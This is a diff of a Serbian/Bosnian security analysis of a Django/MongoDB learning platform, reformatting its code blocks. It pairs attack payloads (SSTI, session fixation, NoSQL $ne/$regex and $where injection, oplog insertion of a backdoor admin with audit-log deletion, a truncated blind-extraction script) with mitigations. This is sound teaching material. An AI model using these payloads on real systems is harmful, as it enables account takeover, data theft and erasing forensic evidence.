@@ -112,8 +112,7 @@ cache ključ koristeći kombinaciju:
 
 -   full path (npr. /api/course/\<id\>/progress/)
 
--   neke Vary headere (tipično Accept-Language, Accept-Encoding, i ono
-    > što response označi kroz Vary)
+-   neke Vary headere (tipično Accept-Language, Accept-Encoding, i ono što response označi kroz Vary)
 
 Ali **ne uključuje** cookie (sessionid) niti request.user. Zbog toga dva
 korisnika koji pošalju isti GET na isti URL, sa istim headerima,
@@ -131,11 +130,9 @@ Tok izgleda ovako:
 
 3.  Pošto je prvi put, cache nema entry → **CACHE MISS**.
 
-4.  View se izvrši, uzme user_id iz session-a, izvuče podatke iz
-    > MongoDB.
+4.  View se izvrši, uzme user_id iz session-a, izvuče podatke iz MongoDB.
 
-5.  Response se vrati klijentu i **upisuje se u cache** pod ključem koji
-    > nije user-specific.
+5.  Response se vrati klijentu i **upisuje se u cache** pod ključem koji nije user-specific.
 
 Sad dolazi ključni momenat napada: napadač (student_b) je takođe
 legitiman korisnik, prijavi se i pozove isti endpoint (isti URL i isti
@@ -145,8 +142,7 @@ cache middleware nalazi prethodno keširani odgovor i vraća ga odmah.
 Najbitnije teorijski: **view se uopšte ne izvršava**. To znači da se ne
 izvršavaju ni:
 
--   request.user.is_authenticated provjera u view-u (jer view nije
-    > pozvan)
+-   request.user.is_authenticated provjera u view-u (jer view nije pozvan)
 
 -   izvlačenje user_id iz session-a
 
@@ -299,31 +295,23 @@ parametar direktno u template string. Kada napadač pošalje {{7\*7}},
 server evaluira izraz i vraća **49** umesto teksta --- čime se potvrđuje
 da se unos interpretira kao template kod. Nakon potvrde, napadač
 pristupa osetljivim objektima iz konteksta. Ranjiva implementacija:
-
-+-----------------------------------------------------------------------+
-| def welcome(request):                                                 |
-|                                                                       |
-| name = request.GET.get(\'name\', \'\')                                |
-|                                                                       |
-| template_str = f\'\<h1\>Dobrodosli, {name}!\</h1\>\'                  |
-|                                                                       |
-| return HttpResponse(Template(template_str).render(Context({})))       |
-+-----------------------------------------------------------------------+
+```
+def welcome(request):
+    name = request.GET.get('name', '')
+    template_str = f'<h1>Dobrodosli, {name}!</h1>'
+    return HttpResponse(Template(template_str).render(Context({})))
+```
 
 Napadač šalje:
-
-  -----------------------------------------------------------------------
+```
   ?name={{7\*7}} → server vraća: 49 (potvrda SSTI)
-
-  -----------------------------------------------------------------------
+```
 
 Napadač zatim pristupa konfiguraciji i podacima iz konteksta:
-
-  -----------------------------------------------------------------------
+```
   ?name={{settings.SECRET_KEY}}\
   ?name={{request.META}}
-
-  -----------------------------------------------------------------------
+```
 
 Nakon potvrde, napadač proširuje napad na curenje informacija iz
 konteksta: tajne konfiguracije, putanje, tokene i kredencijale. U
@@ -336,20 +324,16 @@ Napad se odvija tokom normalnog renderovanja, bez generisanja grešaka.
 Suština mitigacije je da se **korisnički input nikada ne sme
 kompajlirati kao template**. Korisnički unos mora uvek biti prosleđen
 kroz **context kao podatak**, a nikad direktno ubačen u template string.
+```
+# POGRESNO — ranjivo:
+template_str = f'Dobrodosli, {user_input}!'
+return HttpResponse(Template(template_str).render(Context({})))
 
-+-----------------------------------------------------------------------+
-| \# POGRESNO --- ranjivo:                                              |
-|                                                                       |
-| template_str = f\'Dobrodosli, {user_input}!\'                         |
-|                                                                       |
-| return HttpResponse(Template(template_str).render(Context({})))       |
-|                                                                       |
-| \# ISPRAVNO --- input kao podatak u contextu:                         |
-|                                                                       |
-| return render(request, \'welcome.html\', {\'name\': user_input})      |
-|                                                                       |
-| \# U template fajlu: \<h1\>Dobrodosli, {{ name }}!\</h1\>             |
-+-----------------------------------------------------------------------+
+# ISPRAVNO — input kao podatak u contextu:
+return render(request, 'welcome.html', {'name': user_input})
+
+# U template fajlu: <h1>Dobrodosli, {{ name }}!</h1>
+```
 
 Django **auto-escaping** štiti od XSS i sprečava evaluaciju izraza.
 
@@ -426,21 +410,14 @@ prati redirect, a admin view se izvršava bez očekivane zaštite.
 
 Napadač je običan prijavljen korisnik koji koristi razliku u obradi
 URL-a za zaobilaženje autorizacije.
-
-+-----------------------------------------------------------------------+
-| \# Ranjiv custom middleware:                                          |
-|                                                                       |
-| class AuthMiddleware:                                                 |
-|                                                                       |
-| def process_request(self, request):                                   |
-|                                                                       |
-| if request.path.startswith(\'/admin/\'): \# RANJIVO                   |
-|                                                                       |
-| if not request.user.is_staff:                                         |
-|                                                                       |
-| return HttpResponseForbidden()                                        |
-+-----------------------------------------------------------------------+
-
+```
+# Ranjiv custom middleware:
+class AuthMiddleware:
+    def process_request(self, request):
+        if request.path.startswith('/admin/'):  # RANJIVO
+            if not request.user.is_staff:
+                return HttpResponseForbidden()
+```
 Napadač šalje zahtjev **GET /admin/dashboard** bez završne kose crte
 (trailing slash). Zbog toga provjera zasnovana na uslovu
 startswith(\'/admin/\') vraća vrijednost **False**, pa se bezbjednosna
@@ -458,31 +435,20 @@ provera putanje bez normalizacije. Putanju treba normalizovati ili
 koristiti robusno match-ovanje koje pokriva oba oblika URL-a (sa i bez
 trailing slash-a), npr. request.path.rstrip(\'/\') ili regex tipa
 \^/admin(/\|\$).
+```
+# ISPRAVNO — robustna provera putanje:
+class AuthMiddleware:
+    def process_request(self, request):
+        import re
+        if re.match(r'^/admin(/|$)', request.path):
+            if not request.user.is_staff:
+                return HttpResponseForbidden()
 
-+-----------------------------------------------------------------------+
-| \# ISPRAVNO --- robustna provera putanje:                             |
-|                                                                       |
-| class AuthMiddleware:                                                 |
-|                                                                       |
-| def process_request(self, request):                                   |
-|                                                                       |
-| import re                                                             |
-|                                                                       |
-| if re.match(r\'\^/admin(/\|\$)\', request.path):                      |
-|                                                                       |
-| if not request.user.is_staff:                                         |
-|                                                                       |
-| return HttpResponseForbidden()                                        |
-|                                                                       |
-| \# Defense-in-depth --- provera unutar view-a:                        |
-|                                                                       |
-| def admin_view(request):                                              |
-|                                                                       |
-| if not request.user.is_staff:                                         |
-|                                                                       |
-| raise PermissionDenied                                                |
-+-----------------------------------------------------------------------+
-
+# Defense-in-depth — provera unutar view-a:
+def admin_view(request):
+    if not request.user.is_staff:
+        raise PermissionDenied
+```
 Takođe je preporučljivo osloniti se na Django ugrađene kontrole
 pristupa:
 
@@ -543,18 +509,13 @@ Ranjivost nastaje jer se **HTTP POST podaci automatski mapiraju na model
 i čuvaju bez provere privilegija**. Time se briše granica između javno
 izmenjivih i internih sistemskih polja (npr. is_paid, subscription_tier,
 credits_awarded).
-
-+-----------------------------------------------------------------------+
-| \# Ranjiva implementačija:                                            |
-|                                                                       |
-| class EnrollmentForm(ModelForm):                                      |
-|                                                                       |
-| class Meta:                                                           |
-|                                                                       |
-| model = Enrollment                                                    |
-|                                                                       |
-| fields = \'\_\_all\_\_\' \# RANJIVO --- uključuje SVA polja modela    |
-+-----------------------------------------------------------------------+
+```
+# Ranjiva implementačija:
+class EnrollmentForm(ModelForm):
+    class Meta:
+        model = Enrollment
+        fields = '__all__'  # RANJIVO — uključuje SVA polja modela
+```
 
 Primer modelskih polja:
 
@@ -574,17 +535,13 @@ pojavljuju u formi. Pošto **ModelForm** ne razlikuje namenu pojedinih
 polja, svi validni parametri bivaju obrađeni i sačuvani. Napad ne
 zahteva posebne privilegije --- dovoljan je jedan pravilno formiran
 zahtev.
+```
+# Normalan zahtev:
+POST /enroll  course=123
 
-+-----------------------------------------------------------------------+
-| \# Normalan zahtev:                                                   |
-|                                                                       |
-| POST /enroll course=123                                               |
-|                                                                       |
-| \# Napadač modifikuje zahtev:                                         |
-|                                                                       |
-| POST /enroll                                                          |
-| course=123&is_paid=True&subscription_tier=premium&credits_awarded=100 |
-+-----------------------------------------------------------------------+
+# Napadač modifikuje zahtev:
+POST /enroll  course=123&is_paid=True&subscription_tier=premium&credits_awarded=100
+```
 
 Ako forma koristi fields = \'\_\_all\_\_\':
 
@@ -600,35 +557,22 @@ Suština mitigacije je primena **eksplicitne dozvole (whitelist)** umesto
 implicitnog prihvatanja svih polja. Umesto fields = \'\_\_all\_\_\',
 svaka forma mora eksplicitno navoditi samo ona polja koja korisnik
 legitimno sme menjati.
+```
+# ISPRAVNO — eksplicitna whitelist:
+class EnrollmentForm(ModelForm):
+    class Meta:
+        model = Enrollment
+        fields = ['course']  # SAMO javna polja
 
-+-----------------------------------------------------------------------+
-| \# ISPRAVNO --- eksplicitna whitelist:                                |
-|                                                                       |
-| class EnrollmentForm(ModelForm):                                      |
-|                                                                       |
-| class Meta:                                                           |
-|                                                                       |
-| model = Enrollment                                                    |
-|                                                                       |
-| fields = \[\'course\'\] \# SAMO javna polja                           |
-|                                                                       |
-| \# Sistemska polja postaviti programski u view-u:                     |
-|                                                                       |
-| def enroll(request):                                                  |
-|                                                                       |
-| form = EnrollmentForm(request.POST)                                   |
-|                                                                       |
-| if form.is_valid():                                                   |
-|                                                                       |
-| enrollment = form.save(commit=False)                                  |
-|                                                                       |
-| enrollment.student = request.user \# Programski                       |
-|                                                                       |
-| enrollment.is_paid = False \# Programski                              |
-|                                                                       |
-| enrollment.save()                                                     |
-+-----------------------------------------------------------------------+
-
+# Sistemska polja postaviti programski u view-u:
+def enroll(request):
+    form = EnrollmentForm(request.POST)
+    if form.is_valid():
+        enrollment = form.save(commit=False)
+        enrollment.student = request.user  # Programski
+        enrollment.is_paid = False          # Programski
+        enrollment.save()
+```
 Razdvajanje formi prema nivou privilegija --- gde su administrativna
 polja dostupna samo kroz posebne admin forme --- dodatno smanjuje rizik.
 
@@ -694,20 +638,18 @@ za roditeljski domen.
 U drugoj fazi žrtva se prijavljuje: Django upisuje \_auth_user_id u isti
 session, ali ne menja ID. U trećoj fazi napadač koristi poznati session
 ID i dobija potpun pristup nalogu.
+```
+# Faza 1 — napadač nameće poznat session ID (npr. kroz XSS):
+document.cookie = 'sessionid=ATTACKER_KNOWN_ID; path=/'
 
-  -----------------------------------------------------------------------
-  \# Faza 1 --- napadač nameće poznat session ID (npr. kroz XSS):\
-  document.cookie = \'sessionid=ATTACKER_KNOWN_ID; path=/\'\
-  \
-  \# Faza 2 --- žrtva se prijavljuje:\
-  Session: { sessionid: \'ATTACKER_KNOWN_ID\', \_auth_user_id: 42 }\
-  \# ID NIJE PROMENJEN\
-  \
-  \# Faza 3 --- napadač šalje zahtev:\
-  GET /profile/ Cookie: sessionid=ATTACKER_KNOWN_ID\
-  \# Server pronalazi validan autentifikovani session → pristup odobren
+# Faza 2 — žrtva se prijavljuje:
+Session: { sessionid: 'ATTACKER_KNOWN_ID', _auth_user_id: 42 }
+# ID NIJE PROMENJEN
 
-  -----------------------------------------------------------------------
+# Faza 3 — napadač šalje zahtev:
+GET /profile/ Cookie: sessionid=ATTACKER_KNOWN_ID
+# Server pronalazi validan autentifikovani session → pristup odobren
+```
 
 **3) Mitigacija**
 
@@ -716,32 +658,21 @@ identifikatora** nakon promene nivoa privilegija. Najvažnija mera je
 **regeneracija session ID-a** odmah nakon uspešne autentifikacije, čime
 se osigurava da anonimni session ne može postati autentifikovan bez
 promene identiteta.
+```
+def login_view(request):
+    user = authenticate(request, username=u, password=p)
+    if user:
+        old_data = dict(request.session.items())
+        request.session.flush()  # briše stari session, kreira novi ID
+        for key, val in old_data.items():
+            request.session[key] = val
+        login(request, user)
 
-+-----------------------------------------------------------------------+
-| def login_view(request):                                              |
-|                                                                       |
-| user = authenticate(request, username=u, password=p)                  |
-|                                                                       |
-| if user:                                                              |
-|                                                                       |
-| old_data = dict(request.session.items())                              |
-|                                                                       |
-| request.session.flush() \# briše stari session, kreira novi ID        |
-|                                                                       |
-| for key, val in old_data.items():                                     |
-|                                                                       |
-| request.session\[key\] = val                                          |
-|                                                                       |
-| login(request, user)                                                  |
-|                                                                       |
-| \# settings.py --- bezbednosni parametri session cookie-a:            |
-|                                                                       |
-| SESSION_COOKIE_HTTPONLY = True \# nema JavaScript pristupa            |
-|                                                                       |
-| SESSION_COOKIE_SECURE = True \# samo HTTPS                            |
-|                                                                       |
-| SESSION_COOKIE_SAMESITE = \'Lax\' \# zaštita od CSRF                  |
-+-----------------------------------------------------------------------+
+# settings.py — bezbednosni parametri session cookie-a:
+SESSION_COOKIE_HTTPONLY = True   # nema JavaScript pristupa
+SESSION_COOKIE_SECURE = True     # samo HTTPS
+SESSION_COOKIE_SAMESITE = 'Lax'  # zaštita od CSRF
+```
 
 Pored regeneracije session ID-a, neophodno je pravilno konfigurisati
 bezbednosne parametre session cookie-a:
@@ -785,9 +716,8 @@ mešanja odgovora, session fixation omogućava potpuno preuzimanje naloga:
     korišćen sa različitih IP adresa) ili analitike ponašanja sesije,
     napad može ostati potpuno nevidljiv u standardnim logovima.
 
-## ![](media/image2.png){width="6.627083333333333in" height="5.635416666666667in"}
 
-![Dijagram toka podataka](media/image2.png)
+![](media/image2.png)
 
 
 ## Napad 1: NoSQL Injection -- MongoDB Operator Injection 
@@ -825,37 +755,27 @@ Kada korisnički unos sadrži JSON objekat umesto očekivanog string
 skalara, MongoDB interpretira \$ operatore kao legitimne query
 direktive, a ne kao tekst --- čime se u potpunosti menja semantika
 originalnog upita.
+```
+// Ranjiva implementacija — direktno ugrađivanje korisničkog unosa:
+app.post('/login', async (req, res) => {
+    const { username, password } = req.body;
 
-+-----------------------------------------------------------------------+
-| // Ranjiva implementacija --- direktno ugrađivanje korisničkog unosa: |
-|                                                                       |
-| app.post(\'/login\', async (req, res) =\> {                           |
-|                                                                       |
-| const { username, password } = req.body;                              |
-|                                                                       |
-| const user = await db.collection(\'users\').findOne({                 |
-|                                                                       |
-| username: username, // RANJIVO ako je objekat                         |
-|                                                                       |
-| password: password // RANJIVO ako je objekat                          |
-|                                                                       |
-| });                                                                   |
-|                                                                       |
-| if (user) return res.json({ token: generateJWT(user) });              |
-|                                                                       |
-| return res.status(401).json({ error: \'Neispravni kredencijali\' });  |
-|                                                                       |
-| });                                                                   |
-+-----------------------------------------------------------------------+
+    const user = await db.collection('users').findOne({
+        username: username,   // RANJIVO ako je objekat
+        password: password    // RANJIVO ako je objekat
+    });
+
+    if (user) return res.json({ token: generateJWT(user) });
+    return res.status(401).json({ error: 'Neispravni kredencijali' });
+});
+```
 
 Suština ranjivosti je u tome što **Express.js** sa express.json()
 middleware-om automatski parsira JSON request body i može primiti
 objekat tamo gde se očekuje string. Ako klijent pošalje:
-
-  -----------------------------------------------------------------------
-  { \"username\": {\"\$ne\": \"x\"}, \"password\": {\"\$ne\": \"x\"} }
-
-  -----------------------------------------------------------------------
+```
+{ \"username\": {\"\$ne\": \"x\"}, \"password\": {\"\$ne\": \"x\"} }
+```
 
 MongoDB upit efektivno postaje filter koji je tačan za gotovo svaki
 dokument u kolekciji.
@@ -874,19 +794,13 @@ MongoDB upit bez validacije tipa ili sanitizacije, što omogućava
 ubrizgavanje MongoDB operatora.
 
 U implementiranom kodu ranjivost nastaje u sledećem dijelu:
-
-+-----------------------------------------------------------------------+
-| query = {                                                             |
-|                                                                       |
-| \'username\': username,                                               |
-|                                                                       |
-| \'password\': password                                                |
-|                                                                       |
-| }                                                                     |
-|                                                                       |
-| user = db.auth_users.find_one(query)                                  |
-+-----------------------------------------------------------------------+
-
+```
+query = {
+    'username': username,
+    'password': password
+}
+user = db.auth_users.find_one(query)
+```
 Pošto se vrijednosti username i password preuzimaju direktno iz JSON
 tijela zahtjeva, napadač može poslati objekat umjesto stringa i time
 kontrolisati strukturu MongoDB upita.
@@ -895,45 +809,31 @@ U prvoj fazi napadač testira da li aplikacija prihvata MongoDB operatore
 kao dio korisničkog unosa. Najčešće se koristi operator \$ne (not
 equal), koji je logički istinit za gotovo sve vrijednosti. Normalan
 zahtjev:
-
-+-----------------------------------------------------------------------+
-| POST /login                                                           |
-|                                                                       |
-| {\"username\": \"test\", \"password\": \"test\"}                      |
-+-----------------------------------------------------------------------+
+```
+POST /login
+{"username": "test", "password": "test"}
+```
 
 Injection test:
-
-+-----------------------------------------------------------------------+
-| POST /login                                                           |
-|                                                                       |
-| {\"username\": {\"\$ne\": null}, \"password\": {\"\$ne\": null}}      |
-+-----------------------------------------------------------------------+
-
+```
+POST /login
+{"username": {"$ne": null}, "password": {"$ne": null}}
+```
 U ranjivoj implementaciji ovaj payload postaje:
-
-+-----------------------------------------------------------------------+
-| find_one({                                                            |
-|                                                                       |
-| username: { \$ne: null },                                             |
-|                                                                       |
-| password: { \$ne: null }                                              |
-|                                                                       |
-| })                                                                    |
-+-----------------------------------------------------------------------+
+```
+find_one({
+  username: { $ne: null },
+  password: { $ne: null }
+})
+```
 
 Treći sloj je **schema validacija** (npr. Joi):
-
-+-----------------------------------------------------------------------+
-| const schema = Joi.object({                                           |
-|                                                                       |
-| username: Joi.string().alphanum().max(100).required(),                |
-|                                                                       |
-| password: Joi.string().max(128).required()                            |
-|                                                                       |
-| });                                                                   |
-+-----------------------------------------------------------------------+
-
+```
+const schema = Joi.object({
+    username: Joi.string().alphanum().max(100).required(),
+    password: Joi.string().max(128).required()
+});
+```
 Pošto većina korisnika ima ne-null vrijednosti, uslov je zadovoljen i
 baza vraća prvi dokument, što rezultuje **HTTP 200 odgovorom** i
 potvrdom postojanja ranjivosti.
@@ -955,11 +855,9 @@ jednakosti, izvršava se logički izraz koji je gotovo uvijek istinit.
 Na primjer, operator **\$ne** (not equal) omogućava uklanjanje uslova
 provjere lozinke jer će upit biti zadovoljen za sve vrijednosti koje
 nisu identične zadatoj:
-
-  -----------------------------------------------------------------------
-  {\"username\": \"admin\", \"password\": {\"\$ne\": \"x\"}}
-
-  -----------------------------------------------------------------------
+```
+{\"username\": \"admin\", \"password\": {\"\$ne\": \"x\"}}
+```
 
 Ovakav unos rezultuje izvršavanjem upita koji je tačan za gotovo svaki
 dokument, pa baza vraća prvi odgovarajući zapis bez stvarne
@@ -985,11 +883,9 @@ Osnovna ideja sastoji se u slanju niza upita koji postavljaju logička
 pitanja o sadržaju ciljnog polja. Na primjer, korištenjem regularnih
 izraza moguće je provjeriti da li određena vrijednost počinje konkretnim
 karakterom:
-
-  -----------------------------------------------------------------------
+```
   {\"username\": \"admin\", \"password\": {\"\$regex\": \"\^a\"}}
-
-  -----------------------------------------------------------------------
+```
 
 Ako server vrati uspješan odgovor, napadač zaključuje da je uslov tačan.
 Iterativnim ponavljanjem ovog postupka za sve pozicije i moguće
@@ -1008,28 +904,19 @@ Zbog toga je **primarna mjera zaštite implementirana kroz eksplicitnu
 provjeru tipa podataka**. U sigurnoj verziji login endpoint-a uvedena je
 validacija koja osigurava da su username i password **isključivo string
 vrijednosti**:
+```
+if not isinstance(username, str):
+    return JsonResponse({
+        'status': 'error',
+        'message': 'Username must be a string'
+    }, status=400)
 
-+-----------------------------------------------------------------------+
-| if not isinstance(username, str):                                     |
-|                                                                       |
-| return JsonResponse({                                                 |
-|                                                                       |
-| \'status\': \'error\',                                                |
-|                                                                       |
-| \'message\': \'Username must be a string\'                            |
-|                                                                       |
-| }, status=400)                                                        |
-|                                                                       |
-| if not isinstance(password, str):                                     |
-|                                                                       |
-| return JsonResponse({                                                 |
-|                                                                       |
-| \'status\': \'error\',                                                |
-|                                                                       |
-| \'message\': \'Password must be a string\'                            |
-|                                                                       |
-| }, status=400)                                                        |
-+-----------------------------------------------------------------------+
+if not isinstance(password, str):
+    return JsonResponse({
+        'status': 'error',
+        'message': 'Password must be a string'
+    }, status=400)
+```
 
 Ova provjera je ključna jer **operator injection zahtijeva objekat, a ne
 string**. Odbijanjem svih vrijednosti koje nisu stringovi, aplikacija
@@ -1041,63 +928,46 @@ whitelist pristupa**. Umjesto filtriranja zabranjenih karaktera,
 dozvoljavaju se samo jasno definisani obrasci. Za korisničko ime
 primijenjen je regularni izraz koji dozvoljava **isključivo
 alfanumeričke karaktere i donju crtu** u definisanom opsegu dužine:
+```
+import re
 
-+-----------------------------------------------------------------------+
-| import re                                                             |
-|                                                                       |
-| if not re.match(r\'\^\[a-zA-Z0-9\_\]{3,20}\$\', username):            |
-|                                                                       |
-| return JsonResponse({                                                 |
-|                                                                       |
-| \'status\': \'error\',                                                |
-|                                                                       |
-| \'message\': \'Username contains invalid characters or invalid        |
-| length\'                                                              |
-|                                                                       |
-| }, status=400)                                                        |
-+-----------------------------------------------------------------------+
+if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
+    return JsonResponse({
+        'status': 'error',
+        'message': 'Username contains invalid characters or invalid length'
+    }, status=400)
+```
 
 Na ovaj način se sprječava unos specijalnih karaktera, uključujući znak
 \$, koji je ključan za MongoDB operatore. Dodatno je uvedena **kontrola
 dužine lozinke**, čime se sprječavaju pokušaji zloupotrebe velikih ili
 manipulisanih payload-a:
-
-+-----------------------------------------------------------------------+
-| if len(password) \< 6 or len(password) \> 100:                        |
-|                                                                       |
-| return JsonResponse({                                                 |
-|                                                                       |
-| \'status\': \'error\',                                                |
-|                                                                       |
-| \'message\': \'Password length must be between 6-100 characters\'     |
-|                                                                       |
-| }, status=400)                                                        |
-+-----------------------------------------------------------------------+
+```
+if len(password) < 6 or len(password) > 100:
+    return JsonResponse({
+        'status': 'error',
+        'message': 'Password length must be between 6-100 characters'
+    }, status=400)
+```
 
 Kao dodatna zaštitna mjera primijenjena je **eksplicitna konverzija
 vrijednosti u string** (defense-in-depth), čime se dodatno osigurava
 konzistentnost tipa:
-
-+-----------------------------------------------------------------------+
-| username = str(username)                                              |
-|                                                                       |
-| password = str(password)                                              |
-+-----------------------------------------------------------------------+
+```
+username = str(username)
+password = str(password)
+```
 
 Tek nakon što su svi uslovi validacije zadovoljeni, izvršava se MongoDB
 upit:
+```
+query = {
+    'username': username,
+    'password': password
+}
 
-+-----------------------------------------------------------------------+
-| query = {                                                             |
-|                                                                       |
-| \'username\': username,                                               |
-|                                                                       |
-| \'password\': password                                                |
-|                                                                       |
-| }                                                                     |
-|                                                                       |
-| user = db.auth_users.find_one(query)                                  |
-+-----------------------------------------------------------------------+
+user = db.auth_users.find_one(query)
+```
 
 Pošto su username i password sada **garantovano validirani stringovi**,
 MongoDB više ne može interpretirati korisnički unos kao operator izraz.
@@ -1206,54 +1076,37 @@ U prvom koraku napadač dolazi do **admin kredencijala za Config Server**
 source koda i konfiguracionih fajlova. Nakon prijave pristupa
 config.shards kolekciji, koja sadrži kompletne connection stringove za
 sve shard-ove, uključujući interne autentifikacione informacije.
-
-+-----------------------------------------------------------------------+
-| // Pristup Config Serveru i ekstrakcija shard kredencijala:           |
-|                                                                       |
-| use config                                                            |
-|                                                                       |
-| db.shards.find()                                                      |
-|                                                                       |
-| // { \_id: \'shard0\',                                                |
-|                                                                       |
-| // host: \'rs0/shard0-1:27017,shard0-2:27017\',                       |
-|                                                                       |
-| // internalAuth: { keyFile: \'/etc/mongodb/keyfile\' } }              |
-+-----------------------------------------------------------------------+
+```
+// Pristup Config Serveru i ekstrakcija shard kredencijala:
+use config
+db.shards.find()
+// { _id: 'shard0',
+//   host: 'rs0/shard0-1:27017,shard0-2:27017',
+//   internalAuth: { keyFile: '/etc/mongodb/keyfile' } }
+```
 
 U drugom koraku napadač se povezuje **direktno na shard**, zaobilazeći
 mongos i sve aplikacione provere, te ubacuje lažne operacije direktno u
 oplog. Secondary čvorovi kontinuirano čitaju oplog i repliciraju svaku
 operaciju, pa se lažni zapisi propagiraju na sve replike u roku od
 nekoliko sekundi.
+```
+use local
 
-+-----------------------------------------------------------------------+
-| use local                                                             |
-|                                                                       |
-| // Injektovanje lažnog admin korisnika:                               |
-|                                                                       |
-| db.oplog.rs.insert({                                                  |
-|                                                                       |
-| ts: Timestamp(), v: 2, op: \'i\',                                     |
-|                                                                       |
-| ns: \'learnhub.users\',                                               |
-|                                                                       |
-| o: { \_id: ObjectId(), username: \'backdoor\', is_admin: true }       |
-|                                                                       |
-| })                                                                    |
-|                                                                       |
-| // Brisanje audit log zapisa:                                         |
-|                                                                       |
-| db.oplog.rs.insert({                                                  |
-|                                                                       |
-| ts: Timestamp(), op: \'d\',                                           |
-|                                                                       |
-| ns: \'learnhub.audit_logs\',                                          |
-|                                                                       |
-| o: { \_id: ObjectId(\'dokaz_kompromitacije\') }                       |
-|                                                                       |
-| })                                                                    |
-+-----------------------------------------------------------------------+
+// Injektovanje lažnog admin korisnika:
+db.oplog.rs.insert({
+  ts: Timestamp(), v: 2, op: 'i',
+  ns: 'learnhub.users',
+  o: { _id: ObjectId(), username: 'backdoor', is_admin: true }
+})
+
+// Brisanje audit log zapisa:
+db.oplog.rs.insert({
+  ts: Timestamp(), op: 'd',
+  ns: 'learnhub.audit_logs',
+  o: { _id: ObjectId('dokaz_kompromitacije') }
+})
+```
 
 U trećem koraku napadač uklanja tragove kompromitacije injektovanjem
 delete operacija za audit log zapise. Pošto se brisanje propagira kroz
@@ -1264,46 +1117,33 @@ replikaciju, sistem ostaje bez forenzičkog traga napada.
 Suština mitigacije je **stroga mrežna izolacija Config Servera** ---
 mora biti dostupan isključivo sa mongos IP adresa, nikada sa interneta,
 aplikacionog sloja ili developerskih mašina.
-
-+-----------------------------------------------------------------------+
-| \# Mrežna izolacija --- whitelist samo mongos IP-ova:                 |
-|                                                                       |
-| firewall-cmd \--add-rich-rule=\'rule family=ipv4 source               |
-| address=\<mongos_IPs\> accept\'                                       |
-+-----------------------------------------------------------------------+
+```
+# Mrežna izolacija — whitelist samo mongos IP-ova:
+firewall-cmd --add-rich-rule='rule family=ipv4 source address=<mongos_IPs> accept'
+```
 
 Privilegije korisnika na shard-ovima moraju biti minimizovane, posebno
 uklanjanjem direktnog pristupa oplogu.
-
-+-----------------------------------------------------------------------+
-| // Revokacija pristupa oplogu:                                        |
-|                                                                       |
-| db.revokeRolesFromUser(\'shardAdmin\', \[{role: \'dbAdmin\', db:      |
-| \'local\'}\])                                                         |
-+-----------------------------------------------------------------------+
-
+```
+// Revokacija pristupa oplogu:
+db.revokeRolesFromUser('shardAdmin', [{role: 'dbAdmin', db: 'local'}])
+```
 MongoDB auditing treba usmeriti ka eksternom SIEM sistemu koji nije pod
 kontrolom samog clustera.
-
-+-----------------------------------------------------------------------+
-| mongod \--auditDestination syslog \\                                  |
-|                                                                       |
-| \--auditFilter \'{atype: {\$in:                                       |
-| \[\"authenticate\",\"createUser\",\"dropUser\"\]}}\'                  |
-+-----------------------------------------------------------------------+
-
+```
+mongod --auditDestination syslog \
+  --auditFilter '{atype: {$in: ["authenticate","createUser","dropUser"]}}'
+```
 Takođe je važno pratiti pokušaje direktnih konekcija na shard-ove,
 posebno ako dolaze sa IP adresa koje nisu mongos instance.
 
 Dodatne preporuke uključuju:
 
--   korišćenje **X.509 sertifikata** za internu autentifikaciju umesto
-    > lozinki,
+-   korišćenje **X.509 sertifikata** za internu autentifikaciju umesto lozinki,
 
 -   redovnu rotaciju internih kredencijala (najmanje na 90 dana),
 
--   zabranu čuvanja MongoDB lozinki u source kodu ili plaintext
-    > konfiguracijama.
+-   zabranu čuvanja MongoDB lozinki u source kodu ili plaintext konfiguracijama.
 
 **4) Identifikacija pretnje i bezbednosne posledice**
 
@@ -1357,23 +1197,15 @@ collection scan** --- ne može koristiti indekse. JavaScript se izvršava
 sekvencijalno za svaki dokument, bez timeout-a po defaultu, a
 single-threaded priroda izvršavanja znači da jedna zahtevna operacija
 može blokirati ceo worker thread.
-
-+-----------------------------------------------------------------------+
-| \# Ranjiva aplikaciona implementacija:                                |
-|                                                                       |
-| \@app.route(\'/api/search\')                                          |
-|                                                                       |
-| def search_students():                                                |
-|                                                                       |
-| name_filter = request.args.get(\'name\')                              |
-|                                                                       |
-| query = {\'\$where\': f\"this.name == \'{name_filter}\'\"} \# RANJIVO |
-|                                                                       |
-| results = db.students.find(query)                                     |
-|                                                                       |
-| return jsonify(list(results))                                         |
-+-----------------------------------------------------------------------+
-
+```
+# Ranjiva aplikaciona implementacija:
+@app.route('/api/search')
+def search_students():
+    name_filter = request.args.get('name')
+    query = {'$where': f"this.name == '{name_filter}'"}  # RANJIVO
+    results = db.students.find(query)
+    return jsonify(list(results))
+```
 Suština ranjivosti je klasičan **injection princip**: aplikacija
 konstruiše \$where JavaScript izraz konkatenacijom korisničkog unosa bez
 sanitizacije. Napadač može prekinuti originalnu logiku i ubaciti
@@ -1388,70 +1220,48 @@ podataka.
 U prvoj fazi napadač šalje **tautološki izraz** kako bi potvrdio
 injection tačku. Ako endpoint vrati sve dokumente umesto filtriranih,
 ranjivost je potvrđena.
-
-+-----------------------------------------------------------------------+
-| \# Faza 1 --- potvrda injection tačke:                                |
-|                                                                       |
-| GET /api/search?name=\' \|\| 1==1 \|\| \'                             |
-|                                                                       |
-| \# \$where → vraća SVE dokumente                                      |
-+-----------------------------------------------------------------------+
+```
+# Faza 1 — potvrda injection tačke:
+GET /api/search?name=' || 1==1 || '
+# $where → vraća SVE dokumente
+```
 
 U drugoj fazi sledi **schema enumeration** --- otkrivanje polja
 dokumenta pomoću JavaScript funkcija.
-
-+-----------------------------------------------------------------------+
-| \# Faza 2 --- otkrivanje strukture:                                   |
-|                                                                       |
-| GET /api/search?name=\'; return Object.keys(this).join(\',\'); //     |
-|                                                                       |
-| \# Otkriva polja: \_id,name,ssn,email,credits,payment_info            |
-+-----------------------------------------------------------------------+
+```
+# Faza 2 — otkrivanje strukture:
+GET /api/search?name='; return Object.keys(this).join(','); //
+# Otkriva polja: _id,name,ssn,email,credits,payment_info
+```
 
 Centralni deo napada je **Boolean blind ekstrakcija podataka**. Napadač
 postavlja pitanja o svakom karakteru vrednosti polja i zaključuje
 odgovor na osnovu toga da li je dokument vraćen.
-
-+-----------------------------------------------------------------------+
-| def extract_field(student_id, field, max_len=20):                     |
-|                                                                       |
-| extracted = \'\'                                                      |
-|                                                                       |
-| for pos in range(max_len):                                            |
-|                                                                       |
-| for ch in \'0123456789abcdefghijklmnopqrstuvwxyz-@.\':                |
-|                                                                       |
-| payload = f\"\'; if(this.\_id==\'{student_id}\'&&\"                   |
